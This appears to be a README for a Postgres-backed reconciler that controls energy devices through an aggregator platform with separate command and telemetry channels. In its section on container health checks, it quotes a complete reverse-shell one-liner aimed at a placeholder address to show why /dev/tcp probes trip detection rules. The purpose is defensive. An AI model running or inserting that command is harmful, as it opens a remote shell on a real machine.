# device-reconciler-platform

A desired-state reconciler for energy devices — EV chargers, inverters, batteries,
heat pumps — reached through an **aggregator platform** that exposes two separate
channels with two separate clocks.

This is the **operational** half. Its sibling, [`device-reconciler`](../device-reconciler),
is the **logical** half: a pure, dependency-free simulation that works out what it
even means to know whether a command took effect. That repository's README names
its own deliberate gaps, and this one is those gaps, taken seriously:

| | `device-reconciler` | `device-reconciler-platform` |
|---|---|---|
| the problem | can I tell whether my command worked? | can I run that answer for a fleet, forever, through a restart? |
| state | in memory | Postgres: phase, clock model, generation, durable timer |
| dispatch | a function call | outbox → HTTP, idempotency-keyed, at-least-once |
| the platform | an in-process simulator | **a runnable HTTP service** in this repo: OAuth2, pagination, 429s, signed webhooks |
| failure | a scenario | per-vendor rate limits, circuit breakers, jittered backoff, bounded concurrency |
| evidence | ten golden timelines | OpenTelemetry metrics and a readout endpoint |
| dependencies | none | `pg`, OpenTelemetry. No cloud, no AWS, no broker. |

The argument behind both lives in **“Two Channels, Two Clocks”**
(`/articles/two-channels-two-clocks/` on fblln.github.io). Read that for the
reasoning; read the sibling repo for the pure logic; read this one for what it
costs to operate.

---

## The problem, in one paragraph

You cannot talk to consumer energy hardware directly. You talk to a platform,
which talks to a manufacturer's cloud, which talks to the device — over two
channels that share nothing:

|            | command channel                | telemetry channel                             |
| ---------- | ------------------------------ | --------------------------------------------- |
| direction  | you → device                   | device → you                                  |
| timestamps | **your** clock                 | the **device's** clock                        |
| tells you  | the instruction was _received_ | what the device was doing at some past moment |
| latency    | one path                       | a different path                              |
| failure    | one mode                       | a different mode                              |

So: **an ack is not an actuation**, **telemetry describes the past**, and **the
two timestamps are not comparable**. Which produces the question:

> I asked the charger to start 90 seconds ago. Telemetry says `STOPPED`, captured
> at a device time I cannot directly compare to my own.
> **Is the command failing, is my data stale, or can I simply not tell yet?**

The answer is tri-state — `after`, `before`, and **cannot tell** — and `unknown`
is a legitimate outcome that must be waited out rather than guessed past. Where a
device echoes back which instruction it last applied, the question collapses to
integer comparison and no clock is involved at all. That is always preferred.

## What this repository adds

### 1. Durable in-flight state

The phase holds a command id, a generation, a deadline and a device-clock
watermark. In the sibling repo a restart loses all of it and the loop re-issues a
command that is already outstanding — the exact failure the design exists to
prevent. Here:

- **phase, clock model and generation counter live in Postgres** (`db/schema.sql`),
  written in one transaction with the intent to send.
- **the deadline is a column, not a `setTimeout`.** `device.wake_at` plus
  `where wake_at <= now` is the timer, so it survives `SIGKILL`.
- **an outbox** separates deciding from sending, because two systems cannot be
  updated atomically and both orderings of "POST then write" are broken. Delivery
  is at-least-once, which is safe *only* because the command id is also the
  `Idempotency-Key` — the two halves are a pair.
- **generations are minted by the database**, since a counter handed out twice
  makes a device's echo ambiguous.
- **work is claimed with `for update skip locked`** and held on an expiring
  lease, so a worker killed mid-reconcile strands nothing.

Time is stored as **bigint milliseconds, not `timestamptz`** — deliberately, so
that SQL cannot quietly perform the cross-clock comparison TypeScript forbids.
The reasoning is at the top of `db/schema.sql`.

### 2. Real I/O against a runnable mock platform

`src/platform/` is a real HTTP service, in this repository, that runs as a
container: OAuth2 client-credentials with short-lived tokens, a paginated device
list, a command endpoint that **requires** `Idempotency-Key` and replays the
original response, per-vendor rate limits returning `429` with `Retry-After`, and
signed webhook delivery that **retries, duplicates and reorders**.

Each simulated device has its own clock skew (a tenth of the fleet is minutes
wrong), telemetry latency, actuation delay, and pathology — acks-but-never-
applies, rejects-everything, reports-`APPLIED`-early, counts-or-doesn't. All of it
is a pure function of `(SEED, deviceId)`, so a failing run is replayable and
adding a device does not reshuffle the fleet.

Ingest (`src/service/ingest.ts`) is the only externally reachable surface, so it
is treated as a trust boundary: HMAC-SHA256 over `timestamp.body` with the
timestamp *inside* the signed material, `timingSafeEqual`, a freshness window,
and replay protection as a unique index on `inbox.event_id`.

### 3. Scale and backpressure

Three vendors with deliberately different quotas, because a single global limit
starves the fast vendor or gets the slow one banned. Per vendor: a token bucket,
a circuit breaker with a half-open probe, and jittered exponential backoff. Work
runs through a bounded queue the connection pool is sized from. The four dispatch
outcomes are kept distinct because the right response differs:

- **gated** (our own limiter) — no attempt consumed; the request never happened.
- **429** — the attempt is *returned*; a command abandoned for being throttled is
  a command abandoned for being popular.
- **5xx / timeout** — retry with backoff, and count it against vendor health.
- **other 4xx** — abandon; retrying a malformed request is pure load.

Reconciliation is **webhook-driven plus swept**: events give latency, the sweep
gives completeness. A purely event-driven reconciler never revisits the device
that stopped talking, which is the one most likely to have drifted.

### 4. Observability — the two numbers that are the point

OpenTelemetry metrics via a **Prometheus pull exporter** (correct with nothing on
the other end; there is no collector in this repo and no cloud anywhere), plus
structured JSON logs and a readout at `/readout` and `/readout.txt`:

```
vendor          correlated   unknown   clock-fallback   after   before
ALL                    412     11.4%            48.3%     301       64
badger                 139      8.6%             0.0%     118       10
hare                   168      7.1%           100.0%     131       25
tortoise               105     22.9%            61.0%      52       29
```

- **unknown rate** — correlations that could not be decided at all. Zero means the
  tri-state was theatre and a boolean would have done. High means the declared
  skew and latency bounds are too loose for this fleet, which is an operational
  fix, not a code change.
- **clock-fallback rate** — correlations decided by clock bounds rather than a
  generation echo. This is the cost of the fleet's hardware in one number, and the
  procurement argument for devices that count.

`reconcile()` carries the branch it took (`Step.correlation`) — the one addition
to the ported core, and the reason this repository exists: the sibling can *argue*
that correlation is tri-state; a running system has to be able to *show it*.

## Prior art

This is not a novel problem, and the industry has converged on **order by a
counter, not by a clock**:

- **Kubernetes API conventions** — `metadata.generation` is a monotonic sequence
  number for desired state set by one writer; a controller writes back
  `status.observedGeneration`, and a status behind the generation is *known* stale.
  Conditions carry their own, so staleness is tracked per condition.
- **AWS IoT Device Shadow** — desired / reported / delta documents with a `version`
  that increments on every update; an update is processed only if the supplied
  version matches. A `clientToken` ties a response to the request that caused it.
- **OCPP 1.6** — `RemoteStartTransaction.conf` reports only that the charge point
  *accepted and will attempt* the request. Real state arrives separately via
  `StartTransaction` and `StatusNotification`, and the two are observed to
  diverge. *Ack-is-not-actuation, in a spec.*
- **Eclipse Hono** — telemetry ingestion and command &amp; control are explicitly
  separate APIs in opposite directions, with wildly different volumes.
- **RFC 5905 (NTP)** — the minimum-delay filter: the smallest observed round trip
  is the tightest available estimate of the offset, because delay is non-negative
  and variable. `src/core/clock.ts` keeps exactly that one number, for exactly
  that reason — and notes why it bounds the offset from *above* only, which is why
  proving "after" additionally needs a declared maximum latency.
- **The Dataflow / Millwheel watermark** (Akidau et al.) — a monotonic high-water
  mark of event time, used to decide when enough has arrived to act. Borrowed here
  by name: the per-device watermark keeps "is anything new?" an exact same-clock
  comparison, so the lossy cross-clock estimate is needed in exactly one place.
- **Stripe / GitHub webhook signatures** — `t=…,v1=…` with the timestamp inside the
  signed material, and a replay window backed by event-id deduplication.

## Layout

| path | what | why separate |
|---|---|---|
| `src/core/` | the pure half: time, clock, correlation, decision, contracts, rate limit, breaker, backoff, schedule, signature, readout | no I/O, no `Date.now()`, no randomness it does not receive — testable with a virtual clock, and the only code under the 100% gate |
| `src/platform/` | the runnable mock aggregator platform | a fake with a clock, because the failures here are timing failures |
| `src/adapter/` | HTTP client and the per-vendor gate | the error model is the design: outcomes split by what the caller should *do* |
| `src/store/` | Postgres: devices, outbox, inbox, channels, decisions | one parse boundary; the two channels stay two tables |
| `src/service/` | worker, dispatcher, ingest, sweep, queue, report | the loops. No decisions live here |
| `src/app.ts` | the reconciler process | wiring only |
| `db/schema.sql` | the durable state, with the reasoning | the outbox and bigint-milliseconds notes are the two to read |

`src/core/time.ts`, `clock.ts`, `correlate.ts`, `reconcile.ts` and `contracts.ts`
are **ported verbatim** from the sibling repo (plus `Step.correlation`), with a
banner at the top of each saying why they are vendored rather than depended on:
publishing a package from a repository whose whole claim is "no dependencies"
would destroy the property it exists to demonstrate.

## Running it

```bash
npm install
npm run up          # docker compose up -d --wait — Postgres, platform, reconciler
npm run demo        # drives the fleet and prints the readout
npm run logs        # follow all three services
npm run down
```

`--wait` returns only once every service reports healthy, so a script or an agent
can bring the stack up and start asserting with no `sleep`. That works because
every service has a real health check — see the next section, which is not a
tangent.

Local, without Docker, needs only a Postgres:

```bash
PORT=9900 WEBHOOK_URL=http://localhost:9910/webhooks npm run platform
DATABASE_URL=postgres://... npm run reconciler
```

Requires Node 24+, which strips TypeScript natively — **no build step, no
bundler, no `dist/`**. Dev tooling is TypeScript 7, oxlint 1.x and Prettier 3.x,
all current.

## Health checks are not `/dev/tcp`

Every readiness probe here is either an exec-form HTTP request from the runtime
the image already ships (`src/platform/healthcheck.ts`) or `pg_isready`. None of
them is `bash -c '< /dev/tcp/127.0.0.1/8080'`.

That line is the conventional answer for a container with no `curl`, and it is
byte-for-byte the construct every reverse-shell detection rule is written
against: a process wiring one of its own standard streams to a network connection
instead of a terminal. A runtime sensor cannot distinguish it from
`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, because the only difference is the
destination and a signature cannot be written on a destination. Suppressing the
finding means teaching the detector to look away from `bash` in containers.

An HTTP probe also proves *more*: a 200 means a server parsed a request and
answered it, whereas a listening socket only means something bound a port.
Listening and ready are different states. Where an image has a runtime but no
HTTP client, the probe to reach for is a `/proc/net/tcp` grep in exec form —
reading a file is not opening a socket.

Long version: **“The Health Check Was a Reverse Shell”** on fblln.github.io.

## Engineering standards

- **Wide comments that explain why.** Every module states the constraint, the
  trade-off, or the failure mode it guards against. A reader should never have to
  reverse-engineer intent from mechanics.
- **Invariants as executable contracts.** I1–I9 (`src/core/contracts.ts`) run on
  **every** decision in production, not only in tests, because a contract that
  only runs in tests is a comment. I9 is new here: the correlation a decision
  reports must agree with whether the device reported a generation — the readout
  is a fact about the fleet, so the strategy choice gets pinned.
- **Deliberate simplifications are marked `ponytail:`** with the ceiling they
  have and the upgrade path, so a shortcut is a read rather than a discovery.
- **Strict TypeScript**: `erasableSyntaxOnly`, `noUncheckedIndexedAccess`,
  `exactOptionalPropertyTypes`, `noPropertyAccessFromIndexSignature`.

## Status: what is not done yet

Honest list, because an unfinished thing described as finished is worse than an
unfinished thing.

- **Tests are not written.** The intended shape, and the bar the sibling repo
  sets: unit and property tests over `src/core/**` on a virtual clock with a
  seeded LCG and a 100% line/function coverage gate (`npm run test:coverage` is
  wired for it); Testcontainers integration tests against Postgres and the
  in-process platform; a **restart test** that `SIGKILL`s the reconciler between
  the outbox commit and the dispatch, restarts it, and asserts the platform's
  `actuations` counter stayed at one while `idempotentReplays` rose; and a perf
  budget on the decision function.
- **CI workflow** is not written. It should run typecheck, lint, format, the
  coverage gate, the integration suite, and a `docker compose up --wait` smoke.
- **Nothing has been executed.** The code typechecks and lints clean; it has not
  been run against a live Postgres, so expect the first integration pass to find
  SQL and wiring defects.
- `npm run demo` and the readout numbers above are the intended output, not a
  recorded run.

## Deliberate limits

- **One boolean intent** (`charging`). The interesting part is the correlation,
  not the schema.
- **One process, three loops.** Independent failure modes would be split in a
  real deployment; at this size splitting them would add a broker to prove
  something the loops already demonstrate. They are separate functions precisely
  so splitting them later is a change to `src/app.ts` only.
- **The gate is per process.** A device is reconciled by one process at a time,
  but two processes share a vendor quota and each paces to the full limit. The
  429 path self-corrects within one window; a shared bucket is the upgrade.
- **No migration history.** `create table if not exists`, applied at startup, so
  a clean machine needs no migration step. The moment two schema versions must
  coexist, this needs a real migration tool.
- **The skew and latency bounds are declared assumptions, not constants.**
  Tighter bounds decide more often and are wrong more often. That trade-off
  belongs to whoever knows the fleet, so it is an environment variable — and the
  readout exists so the person changing it can see the effect.
